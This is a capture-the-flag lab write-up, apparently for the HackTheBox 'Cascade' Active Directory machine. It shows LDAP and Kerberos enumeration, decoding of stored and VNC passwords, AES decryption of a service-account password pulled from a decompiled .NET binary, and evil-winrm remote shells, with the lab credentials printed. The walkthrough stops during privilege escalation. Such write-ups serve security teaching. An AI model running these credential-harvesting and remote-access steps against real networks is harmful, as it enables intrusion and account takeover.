
![Image Cascade]()

## ---------->> Cascade <<------------

// We start with nmap scan

    $ nmap -sV -A -T4 -Pn 10.10.10.182 -p-
------

    Nmap scan report for 10.10.10.182
    Host is up (0.23s latency).
    Not shown: 65520 filtered tcp ports (no-response)
    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
    | dns-nsid: 
    |_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-09-19 05:42:28Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds?
    636/tcp   open  tcpwrapped
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    49154/tcp open  msrpc         Microsoft Windows RPC
    49155/tcp open  msrpc         Microsoft Windows RPC
    49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49158/tcp open  msrpc         Microsoft Windows RPC
    49170/tcp open  msrpc         Microsoft Windows RPC
    Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

    Host script results:
    | smb2-security-mode: 
    |   2.1: 
    |_    Message signing enabled and required
    | smb2-time: 
    |   date: 2021-09-19T05:43:30
    |_  start_date: 2021-09-19T05:36:14

// First we can see there is an ldap service running with Domain name 'cascade.local', lets add him to /etc/hosts

    $ cat /etc/hosts

    # Host addresses
    10.10.10.182 cascade.local

// Lets try to get more info about the domain with nmap ldap scripts

    $ nmap -n -sV -Pn --script "ldap* and not brute" 10.10.10.182
 
 // It didnt really help me, the output is huge and the only interesting line there is the DC name
 
     $cat nmap_ldapScripts.txt | grep @CASCADE
    |       ldapServiceName: cascade.local:casc-dc1$@CASCADE.LOCAL

// Moving on, Tring to enumerate domain users with MetaSploit and rockyou.txt could work for you

// but it didnt for me(stops after minute)

    msf6 auxiliary(gather/kerberos_enumusers) > options 

    Module options (auxiliary/gather/kerberos_enumusers):

       Name       Current Setting                  Required  Description
       ----       ---------------                  --------  -----------
       DOMAIN     cascade.local                    yes       The Domain Eg: demo.local
       RHOSTS     10.10.10.182                     yes       The target host(s), range CIDR identifier, or hosts fi
                                                             le with syntax 'file:<path>'
       RPORT      88                               yes       The target port
       Timeout    10                               yes       The TCP timeout to establish connection and read data
       USER_FILE  /home/r4r3/Desktop/htb/wordlist  yes       Files containing usernames, one per line
                  s--/rockyou.txt

    msf6 auxiliary(gather/kerberos_enumusers) > exploit 
    [*] Running module against 10.10.10.182

    [*] Validating options...
    [*] Using domain: CASCADE.LOCAL...
    [*] 10.10.10.182:88 - Testing User: "123456"...
    [*] 10.10.10.182:88 - KDC_ERR_C_PRINCIPAL_UNKNOWN - Client not found in Kerberos database
    ...[SNIP]...
    [*] 10.10.10.182:88 - User: "mexico" does not exist
    [*] 10.10.10.182:88 - Testing User: "brianna"...
    [-] Auxiliary failed: Errno::ECONNRESET Connection reset by peer
    [-] Call stack:
    [-]   /usr/lib/ruby/2.7.0/socket.rb:452:in `__read_nonblock'
    [-]   /usr/lib/ruby/2.7.0/socket.rb:452:in `read_nonblock'
    [-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-core-0.1.17/lib/rex/io/stream.rb:91:in `block in read'
    [-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-core-0.1.17/lib/rex/io/stream.rb:351:in `synchronize_access'
    [-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-core-0.1.17/lib/rex/io/stream.rb:89:in `read'
    [-]   /usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/rex-core-0.1.17/lib/rex/io/stream.rb:223:in `get_once'
    [-]   /usr/share/metasploit-framework/lib/rex/proto/kerberos/client.rb:163:in `recv_response_tcp'
    [-]   /usr/share/metasploit-framework/lib/rex/proto/kerberos/client.rb:102:in `recv_response'
    [-]   /usr/share/metasploit-framework/lib/rex/proto/kerberos/client.rb:120:in `send_recv'
    [-]   /usr/share/metasploit-framework/lib/msf/core/exploit/remote/kerberos/client.rb:112:in `send_request_as'
    [-]   /usr/share/metasploit-framework/modules/auxiliary/gather/kerberos_enumusers.rb:67:in `block in run'
    [-]   /usr/share/metasploit-framework/modules/auxiliary/gather/kerberos_enumusers.rb:65:in `each'
    [-]   /usr/share/metasploit-framework/modules/auxiliary/gather/kerberos_enumusers.rb:65:in `run'
    [*] Auxiliary module execution completed

// must be some missing library.... 

// So i tried other ways like [kerbrute](https://github.com/TarlogicSecurity/kerbrute) and [responder](https://tools.kali.org/sniffingspoofing/responder) and [linux4enum](https://tools.kali.org/information-gathering/enum4linux)

// And finally get the most valuable data with [ldapsearch](https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html)(helping [examples](https://access.redhat.com/documentation/en-us/red_hat_directory_server/10/html/administration_guide/examples-of-common-ldapsearches)).

    $ ldapsearch -h 10.10.10.182 -x -b "dc=cascade,dc=local" > ldapsearch_res.txt

// The output is HUGE , so after some digging in the file, i output the unique information(Users&groups and unique value)

    $ cat ldapsearch_res.txt | grep sAMAccountName
-----

    sAMAccountName: CascGuest
    sAMAccountName: Users
    sAMAccountName: Guests
    sAMAccountName: Remote Desktop Users
    sAMAccountName: Network Configuration Operators
    sAMAccountName: Performance Monitor Users
    sAMAccountName: Performance Log Users
    sAMAccountName: Distributed COM Users
    sAMAccountName: IIS_IUSRS
    sAMAccountName: Cryptographic Operators
    sAMAccountName: Event Log Readers
    sAMAccountName: Certificate Service DCOM Access
    sAMAccountName: CASC-DC1$
    sAMAccountName: Domain Computers
    sAMAccountName: Cert Publishers
    sAMAccountName: Domain Users
    sAMAccountName: Domain Guests
    sAMAccountName: Group Policy Creator Owners
    sAMAccountName: RAS and IAS Servers
    sAMAccountName: Pre-Windows 2000 Compatible Access
    sAMAccountName: Incoming Forest Trust Builders
    sAMAccountName: Windows Authorization Access Group
    sAMAccountName: Terminal Server License Servers
    sAMAccountName: Allowed RODC Password Replication Group
    sAMAccountName: Denied RODC Password Replication Group
    sAMAccountName: Enterprise Read-only Domain Controllers
    sAMAccountName: DnsAdmins
    sAMAccountName: DnsUpdateProxy
    sAMAccountName: arksvc
    sAMAccountName: s.smith
    sAMAccountName: r.thompson
    sAMAccountName: util
    sAMAccountName: IT
    sAMAccountName: Production
    sAMAccountName: HR
    sAMAccountName: j.wakefield
    sAMAccountName: AD Recycle Bin
    sAMAccountName: Backup
    sAMAccountName: s.hickson
    sAMAccountName: j.goodhand
    sAMAccountName: Temps
    sAMAccountName: a.turnbull
    sAMAccountName: WinRMRemoteWMIUsers__
    sAMAccountName: Remote Management Users
    sAMAccountName: e.crowe
    sAMAccountName: b.hanson
    sAMAccountName: d.burman
    sAMAccountName: BackupSvc
    sAMAccountName: Factory
    sAMAccountName: Finance
    sAMAccountName: j.allen
    sAMAccountName: i.croft
    sAMAccountName: Audit Share
    sAMAccountName: Data Share
-----

    $ cat ldapsearch_res.txt | grep cascadeLegacyPwd
    cascadeLegacyPwd: clk0bjVldmE=

// We have an encrypted string, lets decrypt it

    $echo 'clk0bjVldmE=' | base64 -d
    rY4n5eva
    
// It looks like user 'r.thompson' password    

    sAMAccountName: r.thompson
    sAMAccountType: 805306368
    userPrincipalName: r.thompson@cascade.local
    objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
    dSCorePropagationData: 20200126183918.0Z
    dSCorePropagationData: 20200119174753.0Z
    dSCorePropagationData: 20200119174719.0Z
    dSCorePropagationData: 20200119174508.0Z
    dSCorePropagationData: 16010101000000.0Z
    lastLogonTimestamp: 132294360317419816
    msDS-SupportedEncryptionTypes: 0
    cascadeLegacyPwd: clk0bjVldmE=
-----

    r.thompson : rY4n5eva

// Earlier when scaned with enum4linux there waz shares enumerating that showed me 

// that we not have permissions to shared files

    [+] Got OS info for 10.10.10.182 from smbclient: 
    [+] Got OS info for 10.10.10.182 from srvinfo:
    Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

// could also check by urself with smbclient

    $ smbclient -N -L \\10.10.10.182
-----

    Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
    SMB1 disabled -- no workgroup available

// Now that we have creds we can See if we have permissions for any shared files


    $smbmap -u r.thompson -p rY4n5eva -H cascade.local
-----

    [+] IP: cascade.local:445	Name: unknown                                           
            Disk                                                  	Permissions	Comment
        ----                                                  	-----------	-------
        ADMIN$                                            	NO ACCESS	Remote Admin
        Audit$                                            	NO ACCESS	
        C$                                                	NO ACCESS	Default share
        Data                                              	READ ONLY	
        IPC$                                              	NO ACCESS	Remote IPC
        NETLOGON                                          	READ ONLY	Logon server share 
        print$                                            	READ ONLY	Printer Drivers
        SYSVOL                                            	READ ONLY	Logon server share 

// After some digging in the directories that we have read permissions on

// I have found file called 'VNC Install.reg' in Data/IT/Temp/s.smith/

    $ cat cascade.local-Data_IT_Temp_s.smith_VNC\ Install.reg 
    
    ...
    "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
    ...
    
// We can see there encrypted password. i tried to decrypt it with some techniques but it didnt work

// So i searched for VNC encrypted password crack and the only thing that work is from [here](https://github.com/frizb/PasswordDecrypts)

    $ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
    00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
    00000008

// Greate!, we got s.smith password

    s.smith : sT333ve2

// We can use now [Evil-winrm](https://github.com/Hackplayers/evil-winrm) to gain shell as s.smith

    $ evil-winrm -i cascade.local -u s.smith -p sT333ve2
------

    *Evil-WinRM* PS C:\Users\s.smith\Documents> whoami
    cascade\s.smith

// And we got user flag !

    *Evil-WinRM* PS C:\Users\s.smith\Desktop>type user.txt
    055255...................


### ----Privilleges Escalation----


// Continue with user s.smith i decided to see if we have more/another directories we can read

    $ smbmap -H 10.10.10.182 -u s.smith -p sT333ve2
-----

    [+] IP: 10.10.10.182:445	Name: cascade.local                                     
            Disk                                                  	Permissions	Comment
        ----                                                  	-----------	-------
        ADMIN$                                            	NO ACCESS	Remote Admin
        Audit$                                            	READ ONLY	
        C$                                                	NO ACCESS	Default share
        Data                                              	READ ONLY	
        IPC$                                              	NO ACCESS	Remote IPC
        NETLOGON                                          	READ ONLY	Logon server share 
        print$                                            	READ ONLY	Printer Drivers
        SYSVOL                                            	READ ONLY	Logon server share 

// Indeed we have another directory called 'Audit$' that we have read permissions on, Lets check him out

    $ smbmap -H 10.10.10.182 -u s.smith -p sT333ve2 -r Audit$
-----

    [+] IP: 10.10.10.182:445	Name: cascade.local                                     
            Disk                                                  	Permissions	Comment
        ----                                                  	-----------	-------
        Audit$                                            	READ ONLY	
        .\Audit$\*
        dr--r--r--                0 Wed Jan 29 13:01:26 2020	.
        dr--r--r--                0 Wed Jan 29 13:01:26 2020	..
        fr--r--r--            13312 Tue Jan 28 16:47:08 2020	CascAudit.exe
        fr--r--r--            12288 Wed Jan 29 13:01:26 2020	CascCrypto.dll
        dr--r--r--                0 Tue Jan 28 16:43:18 2020	DB
        fr--r--r--               45 Tue Jan 28 18:29:47 2020	RunAudit.bat
        fr--r--r--           363520 Tue Jan 28 15:42:18 2020	System.Data.SQLite.dll
        fr--r--r--           186880 Tue Jan 28 15:42:18 2020	System.Data.SQLite.EF6.dll
        dr--r--r--                0 Tue Jan 28 15:42:18 2020	x64
        dr--r--r--                0 Tue Jan 28 15:42:18 2020	x86
    
// We notice that there is exetubale file called 'CascAudit.exe' and 'CascCrypto.dll' library and batch file called 'RunAudit.bat'

// Lets download them and We will back for them later

// Next i search in DB folder

    $ smbmap -H 10.10.10.182 -u s.smith -p sT333ve2 -r Audit$/DB
-----

    [+] IP: 10.10.10.182:445	Name: cascade.local                                     
            Disk                                                  	Permissions	Comment
        ----                                                  	-----------	-------
        Audit$                                            	READ ONLY	
        .\Audit$DB\*
        dr--r--r--                0 Tue Jan 28 16:43:18 2020	.
        dr--r--r--                0 Tue Jan 28 16:43:18 2020	..
        fr--r--r--            24576 Tue Jan 28 16:43:18 2020	Audit.db
-----

// We can see there file called Audit.DB lets download him

    $ smbmap -H 10.10.10.182 -u s.smith -p sT333ve2 --download Audit$/DB/Audit.DB

    [+] Starting download: Audit$\DB\Audit.DB (24576 bytes)
    [+] File output to: /home/r4r3/Desktop/backup_20_9/GitHub/HTB/Machines/Windows/Medium/Cascade/10.10.10.182-Audit_DB_Audit.DB

------

// And open him with sqlite3

    $ sqlite3 10.10.10.182-Audit_DB_Audit.DB 
-----

    sqlite> .tables
    DeletedUserAudit  Ldap              Misc      


    sqlite> .dump Ldap
    PRAGMA foreign_keys=OFF;
    BEGIN TRANSACTION;
    CREATE TABLE IF NOT EXISTS "Ldap" (
        "Id"	INTEGER PRIMARY KEY AUTOINCREMENT,
        "uname"	TEXT,
        "pwd"	TEXT,
        "domain"	TEXT
    );
    INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');
    COMMIT;
    sqlite> 

// When we dump Ldap content, we can see there user's ArkSvc hashed string(seems to be password with base64 encryption)

// Searching many ways to decrypt that string didnt end with any results, so i moved on for now to the 'CascCrypto.dll' file

// That we found earlier in Audit$ folder() also there is other files ('RunAudit.bat' , 'CascAudit.exe') that seems to be realated.

    $ strings 10.10.10.182-Audit_RunAudit.bat 
    CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"

// When view 'RunAudit.bat' content we can see that it 'CascAudit.exe' &  'Audit.db' are realated

// When checking the filetype of 'CascAudit.exe' we can see its /.NET file

    $ file 10.10.10.182-Audit_CascAudit.exe 
    10.10.10.182-Audit_CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows

// When openning CascAudit.exe with [AvaloniaILSpy](https://github.com/icsharpcode/AvaloniaILSpy)(ILSpy for linux)

    c4scadek3y654321

![Image 1]()

// There we can see a key, save him beside for now, and open 'CascCrypto.dll'

![Image 2]()

// There we can see the Encryption process and the IV key 

input - 'BQO5l5Kj9MdErXx6Q6AGOw=='
From Base64
key - 'c4scadek3y654321'
AES encryptin - 128 bits
set IV key '1tdyjCbY1Ix49842'
Cipher mode 1 (CBC)

// Now that we have all information needed we can decrypt it using [CyberCheff](https://gchq.github.io/CyberChef/)

![Image 3]()

// So we have 'ArkSvc' creds 

    ArkSvc : w3lc0meFr31nd

// Lets try to get a shell

    $ evil-winrm -i cascade.local -u ArkSvc -p w3lc0meFr31nd
    
    
    *Evil-WinRM* PS C:\Users\Administrator> whoami /all

    USER INFORMATION
    ----------------

    User Name      SID
    ============== ==============================================
    cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106


    GROUP INFORMATION
    -----------------

    Group Name                                  Type             SID                                            Attributes
    =========================================== ================ ============================================== ===============================================================
    Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
    BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
    BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
    CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
    CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
    CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
    CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
    NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
    Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


    PRIVILEGES INFORMATION
    ----------------------

    Privilege Name                Description                    State
    ============================= ============================== =======
    SeMachineAccountPrivilege     Add workstations to domain     Enabled
    SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
    SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
